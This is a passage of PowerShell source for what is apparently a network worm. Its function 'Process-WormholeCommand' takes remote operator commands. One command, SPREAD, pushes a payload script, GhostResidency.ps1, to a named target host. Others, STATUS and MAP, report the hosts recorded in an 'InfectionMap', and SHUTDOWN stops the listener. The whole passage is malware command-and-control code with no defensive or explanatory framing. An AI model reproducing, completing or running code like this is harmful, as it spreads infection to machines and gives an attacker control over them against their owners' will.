216: function Process-WormholeCommand {
217:     param(
218:         [string]$Command,
219:         [System.IO.StreamWriter]$Writer
220:     )
221:     
222:     $parts = $Command -split ':'
223:     $action = $parts[0].ToUpper()
224:     
225:     switch ($action) {
226:         "SPREAD" {
227:             $target = $parts[1]
228:             $result = Invoke-WormholeSpread -TargetHost $target -PayloadPath "$PSScriptRoot\..\GhostResidency.ps1"
229:             $Writer.WriteLine("SPREAD:$target:$result")
230:         }
231:         "STATUS" {
232:             $count = $script:InfectionMap.Count
233:             $Writer.WriteLine("STATUS:HOSTS:$count")
234:         }
235:         "MAP" {
236:             $map = $script:InfectionMap.Keys -join ','
237:             $Writer.WriteLine("MAP:$map")
238:         }
239:         "SHUTDOWN" {
240:             $Writer.WriteLine("SHUTDOWN:ACK")
241:             Stop-WormholeListener
242:         }
243:         default {
244:             $Writer.WriteLine("UNKNOWN:$Command")
245:         }
246:     }
247:     $Writer.Flush()
248: }
